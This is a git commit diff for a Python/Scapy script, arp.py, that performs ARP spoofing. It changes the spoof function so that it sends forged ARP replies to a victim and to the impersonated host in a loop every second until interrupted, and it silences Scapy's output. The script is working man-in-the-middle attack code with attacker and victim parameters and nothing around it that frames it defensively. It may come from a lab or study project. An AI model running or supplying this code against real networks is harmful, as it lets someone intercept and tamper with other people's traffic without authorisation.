0ab5a13063885c6789ce2b7c2ea1d3ea890dee54
LeonGr <mail+github@leongr.nl>
2021-06-05 11:47:26 +0200

    Automatically make ARP run until interrupt, disable verbose output

--- arp.py
+++ arp.py
@@ -1,34 +1,45 @@
-from scapy.all import Ether, ARP, sendp, srp
+from scapy.all import Ether, ARP, sendp, srp, conf
+import time
 
-# spoof
-def spoof(mac_attacker, mac_victim, ip_to_spoof, ip_victim, interface):
-    arp = Ether() / ARP()
-    # arp[Ether].src = mac_attacker
-    # arp[Ether].dst = mac_victim
-    arp[ARP].hwsrc = mac_attacker
-    arp[ARP].psrc = ip_to_spoof
-    arp[ARP].hwdst = mac_victim
-    arp[ARP].pdst = ip_victim
+# prevent sendp, srp from spamming stdout
+conf.verb = 0
 
-    # arp.show()
+def arp_spoof(mac_attacker, mac_victim, ip_to_spoof, ip_victim, interface):
+    try:
+        print("Started ARP spoofing")
 
-    sendp(arp, iface=interface)
+        while(True):
+            arp = Ether() / ARP()
+            # arp[Ether].src = mac_attacker
+            # arp[Ether].dst = mac_victim
+            arp[ARP].hwsrc = mac_attacker
+            arp[ARP].psrc = ip_to_spoof
+            arp[ARP].hwdst = mac_victim
+            arp[ARP].pdst = ip_victim
 
-    arp = Ether() / ARP()
-    # arp[Ether].src = mac_attacker
-    # arp[Ether].dst = mac_victim
-    arp[ARP].hwsrc = mac_attacker
-    arp[ARP].psrc = ip_victim
-    arp[ARP].hwdst = get_mac(ip_to_spoof, interface)
-    arp[ARP].pdst = ip_to_spoof
+            # arp.show()
 
-    # arp.show()
+            sendp(arp, iface=interface)
 
-    sendp(arp, iface=interface)
+            arp = Ether() / ARP()
+            # arp[Ether].src = mac_attacker
+            # arp[Ether].dst = mac_victim
+            arp[ARP].hwsrc = mac_attacker
+            arp[ARP].psrc = ip_victim
+            arp[ARP].hwdst = get_mac(ip_to_spoof, interface)
+            arp[ARP].pdst = ip_to_spoof
+
+            # arp.show()
+
+            sendp(arp, iface=interface)
+
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print("Stopped ARP spoofing")
 
 def get_mac(ip, interface):
     pakket = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip)
-    pakket.show()
+    # pakket.show()
     answer, unanswered = srp(pakket, iface=interface, timeout=1)
 
     if answer:
